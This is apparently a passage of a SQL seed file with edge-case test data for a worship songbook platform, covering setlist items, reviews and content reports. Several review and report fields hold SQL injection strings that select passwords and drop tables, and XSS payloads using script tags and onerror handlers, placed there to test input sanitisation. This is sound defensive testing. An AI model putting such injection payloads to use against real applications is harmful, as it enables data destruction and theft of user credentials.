    -- Items with maximum length notes
    ('eeeeeeee-6666-6666-6666-666666666666', 'dddddddd-6666-6666-6666-666666666666', 'cccccccc-7777-7777-7777-777777777777', 1, 0, 
     'These are extremely detailed performance notes that include comprehensive instructions for musicians worship leaders sound technicians lighting operators and congregation members covering every aspect of the song performance including intro timing verse dynamics chorus energy bridge modulation outro fade timing microphone positioning instrument arrangements vocal harmonies congregational participation guidelines special instructions for children and youth involvement accessibility considerations for disabled participants multilingual support for international congregation members technical requirements for recording or live streaming cultural sensitivity notes for diverse community worship historical context and theological significance of the song lyrics detailed chord progression analysis for musicians alternative arrangement suggestions for different ensemble sizes emergency backup plans for technical difficulties weather contingencies for outdoor services and comprehensive troubleshooting guides for common performance issues that might arise during the worship service execution', 
     NOW()),
    
    -- Items testing position boundaries
    ('eeeeeeee-7771-7771-7771-777177717771', 'dddddddd-7777-7777-7777-777777777777', 'cccccccc-1111-1111-1111-111111111111', 0, 0, 'Position zero test', NOW()), -- Zero position
    ('eeeeeeee-7772-7772-7772-777277727772', 'dddddddd-7777-7777-7777-777777777777', 'cccccccc-2222-2222-2222-222222222222', 999999, 0, 'Very high position number', NOW()); -- High position

-- ==========================================
-- EDGE CASE REVIEWS
-- ==========================================
INSERT INTO public.reviews (id, song_id, user_id, rating, comment, created_at, updated_at) VALUES
    -- Review with minimal data
    ('ffffffff-1111-1111-1111-111111111111', 'bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb', '11111111-1111-1111-1111-111111111111', 1, NULL, NOW(), NOW()),
    
    -- Review with maximum rating and unicode comment
    ('ffffffff-2222-2222-2222-222222222222', 'cccccccc-cccc-cccc-cccc-cccccccccccc', '22222222-2222-2222-2222-222222222222', 5, 
     '정말 아름다운 찬양곡입니다! 🎵 This is a beautiful worship song that touches the heart deeply. The Korean lyrics combined with English create a wonderful multilingual worship experience. Highly recommended for diverse congregations! 감사합니다 🙏❤️', NOW(), NOW()),
    
    -- Review with SQL injection attempts
    ('ffffffff-3333-3333-3333-333333333333', 'eeeeeeee-eeee-eeee-eeee-eeeeeeeeeeee', '44444444-4444-4444-4444-444444444444', 1, 
     'Comment with SQL: SELECT password FROM users WHERE id = 1; DROP TABLE reviews; -- This song is bad', NOW(), NOW()),
    
    -- Review with XSS attempts
    ('ffffffff-4444-4444-4444-444444444444', 'ffffffff-ffff-ffff-ffff-ffffffffffff', '55555555-5555-5555-5555-555555555555', 1, 
     '<script>alert("XSS Review")</script><img src=x onerror=alert("Review XSS")>This song contains malicious content', NOW(), NOW()),
    
    -- Review with empty comment
    ('ffffffff-5555-5555-5555-555555555555', 'gggggggg-gggg-gggg-gggg-gggggggggggg', '66666666-6666-6666-6666-666666666666', 3, '', NOW(), NOW()),
    
    -- Review with maximum length comment
    ('ffffffff-6666-6666-6666-666666666666', 'dddddddd-dddd-dddd-dddd-dddddddddddd', '33333333-3333-3333-3333-333333333333', 4,
     'This is an extremely comprehensive review that covers every aspect of the song in great detail including the musical composition lyrical content theological significance cultural context historical background performance requirements technical considerations arrangement possibilities instrumentation suggestions vocal range analysis harmonic progression evaluation rhythmic complexity assessment difficulty level for various skill levels suitability for different types of worship services congregational singability factors accessibility considerations for diverse populations multilingual adaptation potential seasonal or thematic appropriateness liturgical calendar connections scripture references theological themes doctrinal accuracy pastoral considerations for song selection worship leader preparation requirements musician skill development opportunities educational value for music ministry programs community building aspects of congregational singing emotional and spiritual impact on worshippers intergenerational appeal cross-cultural sensitivity inclusive language usage gender-neutral options traditional versus contemporary styling decisions tempo and key considerations for different age groups acoustic versus amplified performance options recording quality and availability copyright and licensing information publisher details composer background and other relevant information that worship leaders musicians and music ministry teams should consider when evaluating this song for inclusion in their regular rotation of worship music selections for various types of services and special events throughout the church calendar year',
     NOW(), NOW()),
    
    -- Multiple reviews from same user (should test unique constraint)
    -- This should fail due to UNIQUE(song_id, user_id) constraint - but we'll include it to test error handling
    -- ('ffffffff-7777-7777-7777-777777777777', 'bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb', '11111111-1111-1111-1111-111111111111', 5, 'Duplicate review test', NOW(), NOW()),
    
    -- Review with boundary rating (should be caught by CHECK constraint if rating > 5)
    -- ('ffffffff-8888-8888-8888-888888888888', 'hhhhhhhh-hhhh-hhhh-hhhh-hhhhhhhhhhhh', '77777777-7777-7777-7777-777777777777', 6, 'Invalid rating test', NOW(), NOW()),
    
    -- Review with old timestamp
    ('ffffffff-9999-9999-9999-999999999999', 'hhhhhhhh-hhhh-hhhh-hhhh-hhhhhhhhhhhh', '77777777-7777-7777-7777-777777777777', 3, 'Historical review from the past', '1990-01-01 00:00:00+00', '1990-01-01 00:00:00+00');

-- ==========================================
-- EDGE CASE CONTENT REPORTS
-- ==========================================
INSERT INTO public.content_reports (id, content_id, content_type, reason, description, reported_by, status, resolution, resolved_at, resolved_by, created_at) VALUES
    -- Report with minimal data
    ('gggggggg-1111-1111-1111-111111111111', 'eeeeeeee-eeee-eeee-eeee-eeeeeeeeeeee', 'song', 'inappropriate_content', NULL, '22222222-2222-2222-2222-222222222222', 'pending', NULL, NULL, NULL, NOW()),
    
    -- Report with unicode and detailed information
    ('gggggggg-2222-2222-2222-222222222222', 'ffffffff-ffff-ffff-ffff-ffffffffffff', 'song', 'malicious_content', 
     'This song contains potential XSS attacks and malicious JavaScript code that could compromise user security. The content includes script tags and suspicious HTML elements. 보안 문제가 있는 콘텐츠입니다 🚨', 
     '22222222-2222-2222-2222-222222222222', 'resolved', 'Content removed and user notified. Security team alerted.', NOW(), '22222222-2222-2222-2222-222222222222', NOW()),
    
    -- Report with SQL injection in description
    ('gggggggg-3333-3333-3333-333333333333', 'cccccccc-3333-3333-3333-333333333333', 'arrangement', 'spam', 
     'Report with SQL: SELECT * FROM users; DROP TABLE reports; -- This is spam content', 
     '44444444-4444-4444-4444-444444444444', 'reviewed', NULL, NOW(), '22222222-2222-2222-2222-222222222222', NOW()),
    
    -- Report with XSS in description
    ('gggggggg-4444-4444-4444-444444444444', 'ffffffff-4444-4444-4444-444444444444', 'review', 'offensive_language', 
     '<script>alert("XSS in report")</script><img src=x onerror=alert("Report XSS")>This review is offensive', 
     '55555555-5555-5555-5555-555555555555', 'dismissed', 'No violation found after review', NOW(), '22222222-2222-2222-2222-222222222222', NOW()),
    
    -- Report with empty fields
    ('gggggggg-5555-5555-5555-555555555555', 'gggggggg-gggg-gggg-gggg-gggggggggggg', 'song', 'copyright_violation', '', '66666666-6666-6666-6666-666666666666', 'pending', '', NULL, NULL, NOW()),
    
    -- Report with maximum length fields
    ('gggggggg-6666-6666-6666-666666666666', 'dddddddd-dddd-dddd-dddd-dddddddddddd', 'song', 'inappropriate_content',
     'This is an extremely detailed report that describes in comprehensive detail all of the issues and concerns with the reported content including specific examples of problematic material cultural sensitivity considerations potential copyright violations theological accuracy questions musical arrangement concerns technical implementation issues user interface problems accessibility barriers and various other factors that make this content unsuitable for inclusion in the worship songbook database and require immediate attention from the moderation team to review assess and take appropriate action which may include content removal user notification administrative penalties or other corrective measures as deemed necessary by the moderation policies and community guidelines established for maintaining the quality and appropriateness of all content within the HSA Songbook platform and ensuring a safe positive and spiritually enriching experience for all users regardless of their cultural background theological perspective musical expertise or technical proficiency level',
     '33333333-3333-3333-3333-333333333333', 'pending', NULL, NULL, NULL, NOW()),
    
    -- Historical report with old dates
    ('gggggggg-7777-7777-7777-777777777777', 'bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb', 'song', 'outdated_content', 'This content is from 1990 and may be outdated', '77777777-7777-7777-7777-777777777777', 'resolved', 'Content reviewed and deemed still relevant', '1990-06-01 00:00:00+00', '22222222-2222-2222-2222-222222222222', '1990-01-01 00:00:00+00');

-- ==========================================
-- UPDATE SONGS WITH DEFAULT ARRANGEMENTS
-- ==========================================
UPDATE public.songs 
SET default_arrangement_id = 'cccccccc-1111-1111-1111-111111111111'
WHERE id = 'bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb';

UPDATE public.songs 
SET default_arrangement_id = 'cccccccc-2222-2222-2222-222222222222'
WHERE id = 'cccccccc-cccc-cccc-cccc-cccccccccccc';

-- ==========================================
-- TEST SOME INVALID OPERATIONS (These should fail)
-- ==========================================
-- These are commented out but included to document edge cases that should be tested separately

-- Attempt to insert duplicate song slug (should fail)
-- INSERT INTO public.songs (id, title, slug, created_by) 
-- VALUES ('test-duplicate', 'Test Duplicate', 'minimal-song', '11111111-1111-1111-1111-111111111111');

-- Attempt to insert review with rating > 5 (should fail)
-- INSERT INTO public.reviews (id, song_id, user_id, rating) 
-- VALUES ('invalid-rating', 'bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb', '11111111-1111-1111-1111-111111111111', 6);

-- Attempt to insert duplicate review from same user (should fail)
-- INSERT INTO public.reviews (id, song_id, user_id, rating) 
-- VALUES ('duplicate-review', 'bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb', '11111111-1111-1111-1111-111111111111', 4);

-- Attempt to insert arrangement for non-existent song (should fail)
-- INSERT INTO public.arrangements (id, song_id, name, slug, chord_data, created_by) 
-- VALUES ('invalid-song-ref', 'non-existent-song-id', 'Test', 'test', '{title:Test}', '11111111-1111-1111-1111-111111111111');

COMMIT;

-- ==========================================
-- VERIFICATION QUERIES
-- ==========================================
-- Run these to verify edge case data loaded correctly:

-- Check user counts and edge cases
-- SELECT COUNT(*) as total_users, 
--        COUNT(CASE WHEN username IS NULL THEN 1 END) as null_usernames,
--        COUNT(CASE WHEN username = '' THEN 1 END) as empty_usernames,
--        COUNT(CASE WHEN username LIKE '%script%' THEN 1 END) as suspicious_usernames
-- FROM public.users;

-- Check song edge cases
-- SELECT COUNT(*) as total_songs,
--        COUNT(CASE WHEN alternative_titles = ARRAY[]::TEXT[] THEN 1 END) as empty_alt_titles,
--        COUNT(CASE WHEN title LIKE '%script%' OR title LIKE '%DROP%' THEN 1 END) as suspicious_titles,
--        MIN(composition_year) as min_year,
--        MAX(composition_year) as max_year,
--        COUNT(CASE WHEN views < 0 THEN 1 END) as negative_views
-- FROM public.songs;

-- Check arrangement edge cases
-- SELECT COUNT(*) as total_arrangements,
--        COUNT(CASE WHEN tags = ARRAY[]::TEXT[] THEN 1 END) as empty_tags,
--        COUNT(CASE WHEN chord_data LIKE '%script%' THEN 1 END) as suspicious_chord_data,
--        MIN(tempo) as min_tempo,
--        MAX(tempo) as max_tempo,
--        COUNT(CASE WHEN views < 0 THEN 1 END) as negative_views
-- FROM public.arrangements;

-- Check setlist edge cases
-- SELECT COUNT(*) as total_setlists,
--        COUNT(CASE WHEN name = '' THEN 1 END) as empty_names,
--        COUNT(CASE WHEN name LIKE '%script%' THEN 1 END) as suspicious_names,
--        COUNT(CASE WHEN is_public = false THEN 1 END) as private_setlists
-- FROM public.setlists;

-- Check setlist item edge cases
-- SELECT COUNT(*) as total_items,
--        MIN(transpose_steps) as min_transpose,
--        MAX(transpose_steps) as max_transpose,
--        COUNT(CASE WHEN arrangement_id IS NULL THEN 1 END) as null_arrangements,
--        MIN(position) as min_position,
--        MAX(position) as max_position
-- FROM public.setlist_items;

-- Check review edge cases
-- SELECT COUNT(*) as total_reviews,
--        MIN(rating) as min_rating,
--        MAX(rating) as max_rating,
--        COUNT(CASE WHEN comment IS NULL OR comment = '' THEN 1 END) as empty_comments,
--        COUNT(CASE WHEN comment LIKE '%script%' THEN 1 END) as suspicious_comments
-- FROM public.reviews;

-- Check content report edge cases
-- SELECT COUNT(*) as total_reports,
--        COUNT(CASE WHEN description LIKE '%script%' OR description LIKE '%SELECT%' THEN 1 END) as suspicious_descriptions,
--        COUNT(*) FILTER (WHERE status = 'pending') as pending_reports,
--        COUNT(*) FILTER (WHERE status = 'resolved') as resolved_reports,
--        COUNT(*) FILTER (WHERE status = 'dismissed') as dismissed_reports
-- FROM public.content_reports;

-- Test data integrity
-- SELECT 'Data integrity check' as test_type,
--        COUNT(*) FILTER (WHERE s.default_arrangement_id IS NOT NULL 
--                         AND NOT EXISTS (SELECT 1 FROM public.arrangements a WHERE a.id = s.default_arrangement_id)) as orphaned_default_arrangements
-- FROM public.songs s;